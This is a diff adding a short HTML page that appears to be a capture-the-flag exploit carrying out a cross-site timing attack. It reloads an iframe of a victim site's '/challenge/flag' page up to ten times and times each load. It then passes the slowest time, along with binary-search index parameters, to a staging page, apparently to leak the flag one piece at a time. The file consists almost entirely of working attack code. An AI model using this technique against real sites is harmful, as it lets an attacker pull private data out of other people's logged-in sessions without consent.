@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>pepega</title>
+  </head>
+  <body>
+    <script>
+      let i = 0;
+      let longest_wait = 0;
+      function trigger() {
+        let iframe = document.getElementById('snoop');
+        if (i == 0) { // first load, doesnt count
+          start = performance.now();
+          iframe.src = iframe.src;
+          i++;
+        }
+        else if (i < 10 && longest_wait < 2000) {
+          longest_wait = Math.max(performance.now() - start, longest_wait);
+          console.log(longest_wait);
+          if (longest_wait > 2000) {
+            report(longest_wait);
+          }
+          start = performance.now();
+          iframe.src = iframe.src;
+          i++;
+        }
+        else {
+          report(longest_wait);
+        }
+      }
+      
+      function report(time) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const base = urlParams.get('base');
+        const leftidx = urlParams.get('leftidx');
+        const rightidx = urlParams.get('rightidx');
+        const count = urlParams.get('count');
+        window.location.href = `./staging.html?base=${base}&leftidx=${leftidx}&rightidx=${rightidx}&count=${count}&time=${time}`;
+      }
+      
+      let start = performance.now();
+    </script>
+    <iframe id="snoop" src="https://[VICTIM_SITE]/challenge/flag" onload="trigger()">
+  </body>
+</html>
